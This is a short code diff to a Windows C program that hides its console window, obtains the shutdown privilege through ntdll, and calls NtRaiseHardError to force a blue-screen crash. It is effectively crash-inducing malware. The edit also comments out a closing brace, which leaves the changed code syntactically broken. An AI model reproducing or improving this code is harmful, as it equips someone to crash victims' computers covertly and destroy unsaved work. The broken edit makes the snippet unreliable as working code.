@@ -28,12 +28,10 @@ VOID main()
 {
     // Hide console
     ShowWindow(GetConsoleWindow(), SW_HIDE);
+    // Check if get functions from ntdll.dll failed then exit.
+    if (RtlAdjustPrivilege == NULL || NtRaiseHardError == NULL) { ExitProcess(-1); }
     // Get shutdown privilege and check the result
-    if (Set_Privilege(19, TRUE, FALSE) == STATUS_SUCCESS)
-    {
-        // Trigger bsod if shutdown privilege activated
-        Trigger_BSOD(0xC0000350); // 0xC0000350 = STATUS_HOST_DOWN, The transport determined that the remote system is down.
-    }
+    if (Set_Privilege(19, TRUE, FALSE) == STATUS_SUCCESS) { Trigger_BSOD(0xC0000350); // 0xC0000350 = STATUS_HOST_DOWN, The transport determined that the remote system is down. }
     // Cleanup code
     FreeLibrary(ntdll);
     ExitProcess(1);
